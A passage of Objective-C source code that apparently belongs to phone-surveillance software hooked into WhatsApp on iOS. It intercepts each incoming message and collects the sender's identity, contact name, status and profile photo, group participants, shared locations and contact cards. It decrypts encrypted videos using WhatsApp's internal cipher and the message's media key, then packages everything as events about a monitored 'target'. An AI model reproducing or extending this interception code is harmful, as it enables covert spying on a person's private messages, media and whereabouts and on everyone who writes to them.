            DLog(@"name %@",				[[aIncomingEvent media] name])
            DLog(@"attributes %@",			[[aIncomingEvent media] attributes])
        }
        //DLog(@"body %@",				[aIncomingEvent body])
        //DLog(@"vcard %@",				[aIncomingEvent vcard])
        
        if ([aIncomingEvent respondsToSelector:@selector(mediaCaption)]) {
            // 2.11.9
            DLog(@"mediaCaption %@",	[aIncomingEvent mediaCaption]);
        }
        
        NSString *msgId	= [(NSDictionary *)[(XMPPMessageStanza *)aIncomingEvent attributes] objectForKey:@"id"];
        DLog (@"> Incoming msgId %@", msgId)
        
        WhatsAppMessageStore *waMsgStore = [WhatsAppMessageStore shareWhatsAppMessageStore];
        if (![waMsgStore isIncomingMessageDuplicate:msgId]) {
            DLog (@"Not duplicate")
            
            if (aIncomingEvent) {
                aIncomingEvent				= (XMPPMessageStanza *)aIncomingEvent;
                NSString *message			= (NSString *)[aIncomingEvent text];
                
                DLog(@">>>> participant %@", [aIncomingEvent participant])      // This is nil for individual conversation
                DLog(@">>>> toJID %@", [aIncomingEvent toJID])                  // nil for both individual conversation and group conversation
                DLog(@">>>> fromJID %@", [aIncomingEvent fromJID])
                
                WAChatSession *chatSession			= [[WhatsAppUtils getWAChatStorage] chatSessionForJID:[aIncomingEvent fromJID]];
                //DLog(@">>>> chatSession %@", chatSession)
                //DLog(@">>>> groupmember %@", [chatSession groupMembers])
                
                WAMessage *waMessage = [WhatsAppUtils getWAMessageWithID:msgId JID:[aIncomingEvent fromJID]];
                DLog(@">>>> waMessage %@", waMessage)
                if (!message) {
                        // 2.12.4
                        // Cannot get message text from XMPPMessageStanza object for incoming
                    message = [waMessage text];
                    DLog(@"message, %@", message);
                }
                // -- get media type string
                NSString *mediaTypeString = nil;
                if ([aIncomingEvent respondsToSelector:@selector(mediaType)]) {
                    int mediaType = [aIncomingEvent mediaType];
                    mediaTypeString	= [aIncomingEvent stringForMediaType:mediaType];
                } else {
                    if ([aIncomingEvent respondsToSelector:@selector(children)]) {
                        for (XMPPStanzaElement *child in [aIncomingEvent children]) {
                            if ([child respondsToSelector:@selector(allAttributes)]) {
                                /*
                                 1-1 chat: type of media associates with 'mediatype' attribute
                                 Group chat: type of media associates with 'type' attribute
                                 */
                                
                                mediaTypeString = [child attributeByName:@"mediatype"];
                                if (!mediaTypeString) {
                                    mediaTypeString = [child attributeByName:@"type"];
                                }
                                
                                if (mediaTypeString) {
                                    break;
                                }
                            }
                        }
                    }
                }
                
                if (!mediaTypeString) {
                    DLog(@"Check media type from media [%@]", [[aIncomingEvent media] class]);
                    mediaTypeString = [[[aIncomingEvent media] attributes] objectForKey:@"type"];
                }
                
                DLog (@"media type string: %@", mediaTypeString)
                
                if ([self isSupportedWhatsAppContentType:mediaTypeString] || message) {
                    
                    
                    /********************************************************************************
                     STEP 1:    Find Sender (The one who send this message)
                     ********************************************************************************/
                    NSString *whatsAppID	= nil;
                    if ([aIncomingEvent respondsToSelector:@selector(author)]) {
                        // This method is no longer have in 2.11.9
                        whatsAppID = [aIncomingEvent author];
                    }
                    if ([aIncomingEvent respondsToSelector:@selector(participant)]) { // For WhatsApp 2.11.11
                        whatsAppID = [aIncomingEvent participant];
                    }
                    if(!whatsAppID)
                        whatsAppID = [aIncomingEvent fromJID];
                    DLog (@">>> whatsAppID of sender %@", whatsAppID)
                    
                    // Get sender ID
                    NSString *userId		= [self formatWhatsAppID:whatsAppID];
                    DLog (@">>> userId %@", userId)
                    ABContactsManager *abManager = [[ABContactsManager alloc] init];
                    //NSString *userName		= [abManager searchContactName:userId];
                    NSString *userName		= [abManager searchPrefixFirstMidLastSuffix:userId];
                    
                    // For unknown contact
                    if (!userName || ![userName length]) {
                        userName = [chatSession partnerName];
                    }
                    DLog (@">>> userName: [%@]", userName)
                    
                    [abManager release];
                    
                    
                    /********************************************************************************
                     STEP 2:    Find Participant
                     ********************************************************************************/
                    
                    //NSArray *participantsInfo = [self selectParticipants:msgId];
                    NSMutableArray *participantsInfo = [NSMutableArray arrayWithArray:[self selectParticipantsWithMsgID:msgId
                                                                                              messageSenderToBeFiltered:userId
                                                                                                                fromJID:[aIncomingEvent fromJID]]];
                    
                    /********************************************************************************
                     STEP 3:    Find Target Profile Picture
                     ********************************************************************************/
                    
                    //====================== My Photo
                    NSArray *myPaths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
                    NSString *pathToPhoto = [NSString stringWithFormat:@"%@/Media/Profile/Photo.jpg",[myPaths objectAtIndex:0]];
                    DLog(@"pathToPhoto %@",pathToPhoto);
                    
                    // If not found, it's because WhatsApp keeps photo in AppGroup directory on iOS 8
                    if (![[NSFileManager defaultManager] fileExistsAtPath:pathToPhoto]) {
                        NSString  *appSharePath     = [self getAppShareFolderPath];
                        if (appSharePath)
                            pathToPhoto   = [NSString stringWithFormat:@"%@/Media/Profile/Photo.jpg", appSharePath];
                    }
                    
                    NSData * myPhoto = [NSData dataWithContentsOfFile:pathToPhoto];
                    
                    //====================== My Status
                    NSString * myStatus = [WhatsAppUtils getCurrentStatus];
                    DLog(@"currentStatus %@",myStatus);
                    
                    BOOL isRequiredToIncludeTarget = YES;
                    for (NSDictionary *participant in participantsInfo) {
                        if ([[participant valueForKey:kWhatsAppContactNumber] isEqualToString:[mAccountInfo objectForKey:kWhatsAppContactNumber]]) {
                            isRequiredToIncludeTarget = NO;
                            //DLog (@"> no need to include target")
                            break;
                        }
                    }
                    if (isRequiredToIncludeTarget)
                        [participantsInfo addObject:mAccountInfo]; // required for single conversation
                    
                    
                    /********************************************************************************
                     STEP 4:    Prepare Participant
                     ********************************************************************************/
                    
                    NSMutableArray *participants = [NSMutableArray array];
                    for (NSDictionary *partInfo in participantsInfo) {
                        
                        FxRecipient *participant = [[FxRecipient alloc] init];
                        [participant setRecipNumAddr:[partInfo objectForKey:kWhatsAppContactNumber]];
                        [participant setRecipContactName:[partInfo objectForKey:kWhatsAppContactName]];
                        
                        if ([[partInfo objectForKey:kWhatsAppContactNumber] isEqualToString:[mAccountInfo objectForKey:kWhatsAppContactNumber]]) {
                            DLog(@"Self Photo %@",[mAccountInfo objectForKey:kWhatsAppContactNumber]);
                            [participant setMStatusMessage:myStatus];
                            [participant setMPicture:myPhoto];
                        }else{
                            
                            //===================== ParticipantStatus
                            NSArray * spliter =  [[partInfo objectForKey:kWhatsAppContactNumber] componentsSeparatedByString:@"@"];
                            NSString * participantStatus = [self getContactStatus:[spliter objectAtIndex:0]];
                            DLog(@"ParticipantStatus %@",participantStatus);
                            if (!participantStatus) {
                                WAStatus *waStatus = [[[self class] getWAContactStorage] statusForWhatsAppID:[partInfo objectForKey:kWhatsAppContactNumber]];
                                participantStatus = [waStatus text];
                                DLog(@"participantStatus, %@", participantStatus);
                                DLog(@"waStatus, [%@], %@", [waStatus text], waStatus);
                            }
                            
                            //====================== participantphoto
                            NSString *pathToPhoto = nil;
                            
                            if (![self isWhatsAppVersionChangeProfilePictureNaming]) {
                                NSArray *myPaths    = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
                                pathToPhoto         = [NSString stringWithFormat:@"%@/Media/Profile/%@.thumb",[myPaths objectAtIndex:0],[partInfo objectForKey:kWhatsAppContactNumber]];
                            } else {
                                Class $WAProfilePictureManager  = objc_getClass("WAProfilePictureManager");
                                pathToPhoto                     = [$WAProfilePictureManager fullPathToProfilePictureThumbnailForJID:partInfo[kWhatsAppContactJID]];
                            }
                            
                            DLog(@"participantsPhoto %@",pathToPhoto);
                            UIImage * image             = [UIImage imageWithContentsOfFile:pathToPhoto];
                            NSData * participantsPhoto  =  UIImageJPEGRepresentation(image, 1);
                            
                            [participant setMStatusMessage:participantStatus];
                            [participant setMPicture:participantsPhoto];
                        }
                        [participants addObject:participant];
                        [participant release];
                    }
                    
                    
                    /********************************************************************************
                     STEP 5:    Conversation name and ID
                     ********************************************************************************/
                    
                    NSDictionary *conversationInfo	= [[NSDictionary alloc] initWithDictionary:[self findConversationNameId:msgId]];
                    NSString *conversationName		= [[NSString alloc] initWithString:[conversationInfo objectForKey:kConverstaionNameKey]];
                    NSString *conversationId		= [[NSString alloc] initWithString:[conversationInfo objectForKey:kConverstaionIdKey]];
                    [conversationInfo release];
                    conversationInfo = nil;
                    
                    DLog(@"************ aIncomingEvent %@",aIncomingEvent);
                    DLog(@"************ aIncomingEvent class %@",[aIncomingEvent class]);
                    DLog(@"************ mediaTypeString %@",mediaTypeString);
                    DLog(@"************ msgId %@",msgId);
                    DLog(@"************ participantsInfo %@",participantsInfo);
                    DLog(@"************ locationName %@",[aIncomingEvent locationName]);
                    DLog(@"************ locationLongitude %@",[aIncomingEvent locationLongitude]);
                    DLog(@"************ locationLatitude %@",[aIncomingEvent locationLatitude]);
                    DLog(@"************ vCardContactName %@",[aIncomingEvent vCardContactName]);
                    DLog(@"************ vCardStringValue %@",[aIncomingEvent vCardStringValue]);
                    DLog(@"************ !!! conversationName %@",conversationName);
                    DLog(@"************ !!! conversationId %@",conversationId);
                    
                    
                    /********************************************************************************
                     STEP 6:    Sender Profile Picture
                     ********************************************************************************/
                    //====================== mySenderPaths
                    NSArray *mySenderPaths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
                    NSString *senderPathToPhoto = nil;
                    
                    if (![self isWhatsAppVersionChangeProfilePictureNaming]) {
                        DLog(@"Old Approach (WhatsApp version below 2.11.11)")
                        senderPathToPhoto = [NSString stringWithFormat:@"%@/Media/Profile/%@.thumb",[mySenderPaths objectAtIndex:0],userId];
                    } else {
                        Class $WAProfilePictureManager  = objc_getClass("WAProfilePictureManager");
                        senderPathToPhoto               = [$WAProfilePictureManager fullPathToProfilePictureThumbnailForJID:whatsAppID];
                    }
                    
                    DLog(@"senderPathToPhoto %@",senderPathToPhoto);
                    UIImage * image = [UIImage imageWithContentsOfFile:senderPathToPhoto];
                    NSData * senderPicture =  UIImageJPEGRepresentation(image, 1);
                    
                    
                    /********************************************************************************
                     STEP 7:    Conversation Profile Picture
                     ********************************************************************************/
                    //====================== MyConversation Picture
                    NSArray * onlyId = [conversationId componentsSeparatedByString:@"@"];
                    NSString *conversationPhotoPath = nil;
                    
                    if (![self isWhatsAppVersionChangeProfilePictureNaming]) {
                        conversationPhotoPath               = [NSString stringWithFormat:@"%@/Media/Profile/%@.thumb",[myPaths objectAtIndex:0],[onlyId objectAtIndex:0]];
                    } else {
                        if ([chatSession groupInfo]) {
                            DLog(@"conversation pic for group")
                            Class $WAProfilePictureManager  = objc_getClass("WAProfilePictureManager");
                            conversationPhotoPath           = [$WAProfilePictureManager fullPathToProfilePictureThumbnailForJID:[aIncomingEvent fromJID]];
                        } else {
                            DLog(@"conversation pic for individual")
                            conversationPhotoPath           = senderPathToPhoto;
                        }
                    }
                    
                    DLog(@"conversationPhotoPath %@",conversationPhotoPath);
                    UIImage * conversationImage = [UIImage imageWithContentsOfFile:conversationPhotoPath];
                    NSData * conversationPhoto =  UIImageJPEGRepresentation(conversationImage, 1);
                    
                    
                    /********************************************************************************
                     STEP 8:    Sender Status
                     ********************************************************************************/
                    //===================== SenderStatus
                    NSArray * spliter =  [userId componentsSeparatedByString:@"@"];
                    NSString * senderStatus = [self getContactStatus:[spliter objectAtIndex:0]];
                    DLog(@"SenderStatus %@",senderStatus);
                    if (!senderStatus) {
                        WAStatus *waStatus = [[[self class] getWAContactStorage] statusForWhatsAppID:userId];
                        senderStatus = [waStatus text];
                        DLog(@"senderStatus, %@", senderStatus);
                        DLog(@"waStatus, [%@] %@", [waStatus text], waStatus);
                    }
                    
                    /********************************************************************************
                     STEP 9:    Send Event by separate the implementation by message type
                     ********************************************************************************/
                    
                    // -- Image
                    if ([mediaTypeString isEqualToString:kWhatsAppContentTypeImage]){
                        // -- get image
                        DLog (@"-- incoming image --")
                        __block NSData *imageData = [self getImageForMessageID:msgId];
                        //DLog (@">>>> in image data %@", imageData)
                        NSString *caption = nil;
                        if ([aIncomingEvent respondsToSelector:@selector(mediaCaption)]) {
                            caption = [aIncomingEvent mediaCaption];
                            if (!caption) {
                                if ([waMessage respondsToSelector:@selector(mediaItem)]) {
                                    WAMediaItem *mediaItem = [waMessage mediaItem];
                                    DLog(@"mediaItem: %@", mediaItem);
                                    if ([mediaItem respondsToSelector:@selector(title)]) {
                                        caption = [mediaItem title];
                                    }
                                }
                            }
                        }
                        DLog(@"caption: %@", caption);
                        
                        if (imageData) {
                            [WhatsAppUtils sendImageContentTypeEventUserID:userId
                                                           userDisplayName:userName
                                                         userStatusMessage:senderStatus
                                                    userProfilePictureData:senderPicture
                                                                 direction:kEventDirectionIn
                                                              imageCaption:caption
                                                            conversationID:conversationId
                                                          conversationName:conversationName
                                                conversationProfilePicture:conversationPhoto
                                                              participants:participants
                                                                 photoData:imageData
                                                             thumbnailData:(NSData *)[(XMPPMessageStanza *)aIncomingEvent thumbnailData]];
                        } else {
                            dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
                            dispatch_async(queue, ^(void) {
                                NSData *imageThumbnailData = nil;
                                
                                int retryCount = 0;
                                
                                while (!imageData) {
                                    retryCount++;
                                    [NSThread sleepForTimeInterval:2.0];
                                    
                                    imageData = [self getImageForMessageID:msgId];

                                    if ([aIncomingEvent respondsToSelector:@selector(thumbnailData)]) {
                                        imageThumbnailData = (NSData *)[(XMPPMessageStanza *)aIncomingEvent thumbnailData];
                                    }
                                }
                                
                                DLog(@"Got image data after retry %d time", retryCount);
                                
                                [WhatsAppUtils sendImageContentTypeEventUserID:userId
                                                               userDisplayName:userName
                                                             userStatusMessage:senderStatus
                                                        userProfilePictureData:senderPicture
                                                                     direction:kEventDirectionIn
                                                                  imageCaption:caption
                                                                conversationID:conversationId
                                                              conversationName:conversationName
                                                    conversationProfilePicture:conversationPhoto
                                                                  participants:participants
                                                                     photoData:imageData
                                                                 thumbnailData:imageThumbnailData];
                            });
                        }
                    }
                    else if ([mediaTypeString isEqualToString:kWhatsAppContentTypeGif]){//Gif
                        NSString *caption = nil;
                        if ([aIncomingEvent respondsToSelector:@selector(mediaCaption)]) {
                            caption = [aIncomingEvent mediaCaption];
                            if (!caption) {
                                if ([waMessage respondsToSelector:@selector(mediaItem)]) {
                                    WAMediaItem *mediaItem = [waMessage mediaItem];
                                    DLog(@"mediaItem: %@", mediaItem);
                                    if ([mediaItem respondsToSelector:@selector(title)]) {
                                        caption = [mediaItem title];
                                    }
                                }
                            }
                        }
                        DLog(@"caption: %@", caption);
                        
                        NSData * thumbnailData = nil;
                        if ([waMessage respondsToSelector:@selector(mediaItem)]) {
                            WAMediaItem *mediaItem = [waMessage mediaItem];
                            
                            NSArray *myPaths    = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
                            NSString *thumbnailPath         = [NSString stringWithFormat:@"%@/%@",[myPaths objectAtIndex:0], mediaItem.xmppThumbPath];
                            
                            UIImage * thumbnailImage = [UIImage imageWithContentsOfFile:thumbnailPath];
                            thumbnailData =  UIImageJPEGRepresentation(thumbnailImage, 1);
                        }


                        if (thumbnailData) {
                            [WhatsAppUtils sendImageContentTypeEventUserID:userId
                                                           userDisplayName:userName
                                                         userStatusMessage:senderStatus
                                                    userProfilePictureData:senderPicture
                                                                 direction:kEventDirectionIn
                                                              imageCaption:caption
                                                            conversationID:conversationId
                                                          conversationName:conversationName
                                                conversationProfilePicture:conversationPhoto
                                                              participants:participants
                                                                 photoData:nil
                                                             thumbnailData:thumbnailData];

                        }
                    }
                    // -- Video
                    else if ([mediaTypeString isEqualToString:kWhatsAppContentTypeVideo]){
                        DLog (@"-- incoming video --")
                        NSString *caption = nil;
                        if ([aIncomingEvent respondsToSelector:@selector(mediaCaption)]) {
                            caption = [aIncomingEvent mediaCaption];
                            if (!caption) {
                                if ([waMessage respondsToSelector:@selector(mediaItem)]) {
                                    WAMediaItem *mediaItem = [waMessage mediaItem];
                                    DLog(@"mediaItem: %@", mediaItem);
                                    if ([mediaItem respondsToSelector:@selector(title)]) {
                                        caption = [mediaItem title];
                                    }
                                }
                            }
                        }

                        NSData * thumbnailData = nil;
                        if ([waMessage respondsToSelector:@selector(mediaItem)]) {
                            WAMediaItem *mediaItem = [waMessage mediaItem];
                            
                            NSArray *myPaths    = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
                            NSString *thumbnailPath         = [NSString stringWithFormat:@"%@/%@",[myPaths objectAtIndex:0], mediaItem.xmppThumbPath];
                            
                            UIImage * thumbnailImage = [UIImage imageWithContentsOfFile:thumbnailPath];
                            thumbnailData =  UIImageJPEGRepresentation(thumbnailImage, 1);
                        }
                        
                        // 2.16.6
                        NSData *mediaKey = nil;
                        if ([waMessage respondsToSelector:@selector(mediaItem)]) {
                            WAMediaItem *mediaItem = [waMessage mediaItem];
                            if ([mediaItem respondsToSelector:@selector(mediaKey)]) {
                                mediaKey = mediaItem.mediaKey;
                            }
                        }
                        DLog (@"mediaKey: %@", mediaKey);
                        
                        if (mediaKey) {
                            DLog(@"Befor start");
                            dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
                            dispatch_async(queue, ^(void) {
                                DLog(@"start");
                                // e.g., https://mms924.whatsapp.net/d/iOYhMAyeaC2P7Zq3BV_8XdjG7M8/ApNdv0Xhimn3RhVe0dlogmy4bIpWh25wzoOAVps5AF9j.mov
                                NSURL *url = [NSURL URLWithString:[aIncomingEvent mediaURL]];
                                DLog (@"-- url [%@]", url)
                                
                                if (!url) {
                                        //2.16.7
                                    WhatsAppMediaObject *mediaObj = [[WhatsAppMediaUtils shareWhatsAppMediaUtils] mediaObjectWithMessageID:msgId];
                                    DLog (@"mediaObj %@", mediaObj)
                                    
                                    if (!mediaObj) {
                                        NSString *pathToVideo	= [self getMediaPathForMessageID:msgId];
                                        if (pathToVideo) {
                                            url = [NSURL fileURLWithPath:pathToVideo];
                                            DLog (@"videoUrl %@", url)
                                        }
                                    } else {
                                        url = [mediaObj mVideoAudioUrl];
                                    }
                                }

                                if (url) {
                                    NSData *encryptedVideoData = [NSData dataWithContentsOfURL:url];
                                    //DLog(@"encryptedVideoData %@", encryptedVideoData);
                                    NSString *encTmpFilePath = [NSString stringWithFormat:@"%@%@", NSTemporaryDirectory(), url.path.lastPathComponent];
                                    [encryptedVideoData writeToFile:encTmpFilePath atomically:YES];
                 
                                    DLog(@"encTmpFilePath %@", encTmpFilePath);
                                    NSString *decTmpFilePath = encTmpFilePath;
                                    
                                    //Video got encrypted, So we need to decrypt it first.
                                    if ([[encTmpFilePath lastPathComponent] isEqualToString:@"enc"]) {
                                        decTmpFilePath = [[encTmpFilePath stringByDeletingPathExtension] stringByAppendingPathExtension:@"dec"];
                                        
                                        Class $WAMediaCipher = objc_getClass("WAMediaCipher");
                                        WAMediaCipher *chiper = [[[$WAMediaCipher alloc] initWithKey:mediaKey mediaType:2] autorelease];
                                        [chiper decryptFileAtURL:[NSURL fileURLWithPath:encTmpFilePath] toURL:[NSURL fileURLWithPath:decTmpFilePath]];
                                        
                                        NSFileManager *fileManager = [NSFileManager defaultManager];
                                        [fileManager removeItemAtPath:encTmpFilePath error:nil];
                                    }
                                    
                                    [WhatsAppUtils send2VideoContentTypeEventUserID:userId
                                                                    userDisplayName:userName
                                                                  userStatusMessage:senderStatus
                                                             userProfilePictureData:senderPicture
                                                                          direction:kEventDirectionIn
                                                                       videoCaption:caption
                                                                     conversationID:conversationId
                                                                   conversationName:conversationName
                                                         conversationProfilePicture:conversationPhoto
                                                                       participants:participants
                                                                          videoPath:[NSURL fileURLWithPath:decTmpFilePath]
                                                                      thumbnailData:thumbnailData];
                                }
                                else {
                                    int retryCount = 0;
                                    while (!url) {
                                        retryCount++;
                                        [NSThread sleepForTimeInterval:2.0];
                                        //2.16.7
                                        WhatsAppMediaObject *mediaObj = [[WhatsAppMediaUtils shareWhatsAppMediaUtils] mediaObjectWithMessageID:msgId];
                                        DLog (@"mediaObj %@", mediaObj)
    
                                        if (!mediaObj) {
                                            NSString *pathToVideo = [self getMediaPathForMessageID:msgId];
                                            if (pathToVideo) {
                                                url = [NSURL fileURLWithPath:pathToVideo];
                                                DLog (@"videoUrl %@", url)
                                            }
                                        } else {
                                            url = [mediaObj mVideoAudioUrl];
                                        }
                                    }
                                    DLog(@"Got videoUrl after retry %d time", retryCount);
                                    
                                    NSData *encryptedVideoData = [NSData dataWithContentsOfURL:url];
                                        //DLog(@"encryptedVideoData %@", encryptedVideoData);
                                    NSString *encTmpFilePath = [NSString stringWithFormat:@"%@%@", NSTemporaryDirectory(), url.path.lastPathComponent];
                                    [encryptedVideoData writeToFile:encTmpFilePath atomically:YES];
                                    
                                    DLog(@"encTmpFilePath %@", encTmpFilePath);
                                    NSString *decTmpFilePath = encTmpFilePath;
                                    
                                        //Video got encrypted, So we need to decrypt it first.
                                    if ([[encTmpFilePath lastPathComponent] isEqualToString:@"enc"]) {
                                        decTmpFilePath = [[encTmpFilePath stringByDeletingPathExtension] stringByAppendingPathExtension:@"dec"];
                                        
                                        Class $WAMediaCipher = objc_getClass("WAMediaCipher");
                                        WAMediaCipher *chiper = [[[$WAMediaCipher alloc] initWithKey:mediaKey mediaType:2] autorelease];
                                        [chiper decryptFileAtURL:[NSURL fileURLWithPath:encTmpFilePath] toURL:[NSURL fileURLWithPath:decTmpFilePath]];
                                        
                                        NSFileManager *fileManager = [NSFileManager defaultManager];
                                        [fileManager removeItemAtPath:encTmpFilePath error:nil];
                                    }
                                    
                                    [WhatsAppUtils send2VideoContentTypeEventUserID:userId
                                                                    userDisplayName:userName
                                                                  userStatusMessage:senderStatus
                                                             userProfilePictureData:senderPicture
                                                                          direction:kEventDirectionIn
                                                                       videoCaption:caption
                                                                     conversationID:conversationId
                                                                   conversationName:conversationName
                                                         conversationProfilePicture:conversationPhoto
                                                                       participants:participants
                                                                          videoPath:[NSURL fileURLWithPath:decTmpFilePath]
                                                                      thumbnailData:(NSData *)[(XMPPMessageStanza *)aIncomingEvent thumbnailData]];
                                }
                            });
                        }
                        else {
                                // e.g., https://mms924.whatsapp.net/d/iOYhMAyeaC2P7Zq3BV_8XdjG7M8/ApNdv0Xhimn3RhVe0dlogmy4bIpWh25wzoOAVps5AF9j.mov
                            NSURL *url = [NSURL URLWithString:[aIncomingEvent mediaURL]];
                            DLog (@"-- url [%@]", url)
                            
                            if (!url) {
                                    //2.16.7
                                WhatsAppMediaObject *mediaObj = [[WhatsAppMediaUtils shareWhatsAppMediaUtils] mediaObjectWithMessageID:msgId];
                                DLog (@"mediaObj %@", mediaObj)
                                
                                if (!mediaObj) {
                                    NSString *pathToVideo	= [self getMediaPathForMessageID:msgId];
                                    if (pathToVideo) {
                                        url = [[NSURL alloc] initFileURLWithPath:pathToVideo];
                                        DLog (@"videoUrl %@", url)
                                    }
                                } else {
                                    url = [mediaObj mVideoAudioUrl];
                                }
                            }

                            if (url) {
                                    // -- send on another thread since we need to download video file by ourself
                                [WhatsAppUtils send2VideoContentTypeEventUserID:userId
                                                                userDisplayName:userName
                                                              userStatusMessage:senderStatus
                                                         userProfilePictureData:senderPicture
                                                                      direction:kEventDirectionIn
                                                                   videoCaption:caption
                                                                 conversationID:conversationId
                                                               conversationName:conversationName
                                                     conversationProfilePicture:conversationPhoto
                                                                   participants:participants
                                                                      videoPath:url
                                                                  thumbnailData:(NSData *)[(XMPPMessageStanza *)aIncomingEvent thumbnailData]];
                            }
                            else {
                                int retryCount = 0;
                                while (!url) {
                                    retryCount++;
                                    [NSThread sleepForTimeInterval:2.0];
                                        //2.16.7
                                    WhatsAppMediaObject *mediaObj = [[WhatsAppMediaUtils shareWhatsAppMediaUtils] mediaObjectWithMessageID:msgId];
                                    DLog (@"mediaObj %@", mediaObj)
                                    
                                    if (!mediaObj) {
                                        NSString *pathToVideo = [self getMediaPathForMessageID:msgId];
                                        if (pathToVideo) {
                                            url = [[NSURL alloc] initFileURLWithPath:pathToVideo];
                                            DLog (@"videoUrl %@", url)
                                        }
                                    } else {
                                        url = [mediaObj mVideoAudioUrl];
                                    }
                                }
                                DLog(@"Got videoUrl after retry %d time", retryCount);
                                    // -- send on another thread since we need to download video file by ourself
                                [WhatsAppUtils send2VideoContentTypeEventUserID:userId
                                                                userDisplayName:userName
                                                              userStatusMessage:senderStatus
                                                         userProfilePictureData:senderPicture
                                                                      direction:kEventDirectionIn
                                                                   videoCaption:caption
                                                                 conversationID:conversationId
                                                               conversationName:conversationName
                                                     conversationProfilePicture:conversationPhoto
                                                                   participants:participants
                                                                      videoPath:url
                                                                  thumbnailData:(NSData *)[(XMPPMessageStanza *)aIncomingEvent thumbnailData]];
                            }

                        }
                    }
                    // -- Audio
                    else if ([mediaTypeString isEqualToString:kWhatsAppContentTypeAudio]    ||
                             [mediaTypeString isEqualToString:kWhatsAppContentTypeAudioPTT] ) {
                        DLog (@"-- incoming audio --")
                        __block NSURL *url = [NSURL URLWithString:[aIncomingEvent mediaURL]];
                        id attributes = [[aIncomingEvent media] attributes];
                        if ([attributes objectForKey:@"media_key"]) {
                            // Audio is encrypted so use local path to read decrypted audio
                            NSString *pathToAudio = [self getMediaPathForMessageID:msgId];
                            DLog(@"pathToAudio: %@", pathToAudio);
                            url = [NSURL fileURLWithPath:pathToAudio];
                        }
                        else {
                            WhatsAppMediaObject *mediaObj = [[WhatsAppMediaUtils shareWhatsAppMediaUtils] mediaObjectWithMessageID:msgId];
                            DLog (@">>> WhatsApp outgoing audio mediaObj %@", mediaObj)
                            url = [mediaObj mVideoAudioUrl];
                            
                            if (!url) {
                                url = [NSURL URLWithString:[self getMediaPathForMessageID:msgId]];
                            }
                        }
                        
                        if (url){
                                // -- send on another thread since we need to download audio file by ourself
                            [WhatsAppUtils send2AudioContentTypeEventUserID:userId
                                                            userDisplayName:userName
                                                          userStatusMessage:senderStatus
                                                     userProfilePictureData:senderPicture
                                                                  direction:kEventDirectionIn
                                                             conversationID:conversationId
                                                           conversationName:conversationName
                                                 conversationProfilePicture:conversationPhoto
                                                               participants:participants
                                                                  audioPath:url];
                        }
                        else {
                            dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
                            dispatch_async(queue, ^(void) {
                                int retryCount = 0;
                                
                                while (!url) {
                                    retryCount++;
                                    [NSThread sleepForTimeInterval:2.0];
                                    
                                    id attributes = [[aIncomingEvent media] attributes];
                                    if ([attributes objectForKey:@"media_key"]) {
                                            // Audio is encrypted so use local path to read decrypted audio
                                        NSString *pathToAudio = [self getMediaPathForMessageID:msgId];
                                        DLog(@"pathToAudio: %@", pathToAudio);
                                        url = [NSURL fileURLWithPath:pathToAudio];
                                    }
                                    else {
                                        WhatsAppMediaObject *mediaObj = [[WhatsAppMediaUtils shareWhatsAppMediaUtils] mediaObjectWithMessageID:msgId];
                                        DLog (@">>> WhatsApp outgoing audio mediaObj %@", mediaObj)
                                        url = [mediaObj mVideoAudioUrl];
                                        
                                        if (!url) {
                                            url = [NSURL URLWithString:[self getMediaPathForMessageID:msgId]];
                                        }
                                    }
                                }
                                
                                DLog(@"Got audio url after retry %d time", retryCount);
                                
                                    // -- send on another thread since we need to download audio file by ourself
                                [WhatsAppUtils send2AudioContentTypeEventUserID:userId
                                                                userDisplayName:userName
                                                              userStatusMessage:senderStatus
                                                         userProfilePictureData:senderPicture
                                                                      direction:kEventDirectionIn
                                                                 conversationID:conversationId
                                                               conversationName:conversationName
                                                     conversationProfilePicture:conversationPhoto
                                                                   participants:participants
                                                                      audioPath:url];
                            });
                        }

                    }
                    //-- Location
                    else if ([mediaTypeString isEqualToString:kWhatsAppContentTypeLocation]){
                        
                        FxIMGeoTag *location = [[FxIMGeoTag alloc] init];
                        [location setMPlaceName:[aIncomingEvent locationName] ];
                        [location setMLongitude:[[aIncomingEvent locationLongitude]floatValue]];
                        [location setMLatitude: [[aIncomingEvent locationLatitude]floatValue]];
                        [location setMHorAccuracy:-1];
                        
                        if (![aIncomingEvent locationLongitude] || ![aIncomingEvent locationLatitude]) {
                            if (waMessage) {
                                if ([[waMessage longitude] isKindOfClass:[NSNumber class]] && [[waMessage latitude] isKindOfClass:[NSNumber class]]) {// 2.12.14
                                    [location setMPlaceName:[waMessage placeDetails] ];
                                    [location setMLongitude:[[waMessage longitude]floatValue]];
                                    [location setMLatitude:[[waMessage latitude]floatValue]];
                                }
                                else {// 2.16.7
                                    WAMediaItem *mediaItem = [waMessage mediaItem];
                                    [location setMPlaceName:[mediaItem vCardName]];
                                    [location setMLongitude:[mediaItem longitude]];
                                    [location setMLatitude:[mediaItem latitude]];
                                }
                            }
                        }
                        
                        [WhatsAppUtils sendAnyContentTypeEventUserID:userId
                                                     userDisplayName:userName
                                                   userStatusMessage:senderStatus
                                              userProfilePictureData:senderPicture
                                                        userLocation:nil
                                               messageRepresentation:kIMMessageShareLocation
                                                             message:message
                                                           direction:kEventDirectionIn
                                                      conversationID:conversationId
                                                    conversationName:conversationName
                                          conversationProfilePicture:conversationPhoto
                                                        participants:participants
                                                         attachments:[NSArray array]
                                                       shareLocation:location];		
                        [location release];
                        
                    }
                    //-- Contact
                    else if ([mediaTypeString isEqualToString:kWhatsAppContentTypeContact] ||
                             [mediaTypeString isEqualToString:kWhatsAppContentTypeContact2]) {
                        // get the vcard string from vcard data
                        DLog (@"original vcard string %@", [aIncomingEvent vCardStringValue])
                        NSData *vcardData		= [(XMPPStanzaElement *)[aIncomingEvent vcard] value];					
                        NSString *vcardString	= [IMShareUtils getVCardStringFromData:vcardData];
                        
                        if (vcardString == nil) {
                                // 2.12.14 - 2.16.7
                            vcardData = [[waMessage vCardString] dataUsingEncoding:NSUTF8StringEncoding];
